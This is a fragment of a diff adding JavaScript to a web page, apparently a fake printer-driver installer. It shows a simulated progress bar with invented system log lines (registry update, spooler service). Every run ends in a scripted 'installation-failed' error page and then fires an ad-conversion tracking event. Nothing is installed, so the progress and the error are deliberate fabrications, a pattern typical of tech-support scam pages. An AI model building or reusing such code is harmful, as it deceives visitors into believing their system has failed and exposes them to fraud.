+                { v: 75, t: "Configuring Wireless Port...", l: "> Port: 192.168.1.105 found." },
+                { v: 90, t: "Finalizing Registry Update...", l: "> RegEdit: OK." },
+                { v: 98, t: "Starting Spooler Service...", l: "> Error: Service Timeout." }
+            ];
+
+            let val = 0;
+            let idx = 0;
+
+            const timer = setInterval(() => {
+                val += Math.random() * 1.5; 
+                
+                if(idx < phases.length && val >= phases[idx].v) {
+                    stg.innerText = phases[idx].t;
+                    const item = document.createElement('div');
+                    item.innerText = phases[idx].l;
+                    log.appendChild(item);
+                    log.scrollTop = log.scrollHeight;
+                    idx++;
+                }
+
+                if(val > 100) val = 100;
+                bar.style.width = `${val}%`;
+                pct.innerText = `${Math.floor(val)}%`;
+
+                if(val >= 100) {
+                    clearInterval(timer);
+                    setTimeout(() => {
+                        navTo('err', 'error/installation-failed');
+                        if(typeof gtag === 'function') {
+                            gtag('event', 'conversion', {'send_to': 'AW-17754747703/5oaICNngxMUbELfmj5JC'});
+                        }
+                    }, 1000);
+                }
+            }, 150);
+        }
+    </script>
 </body>
 </html>
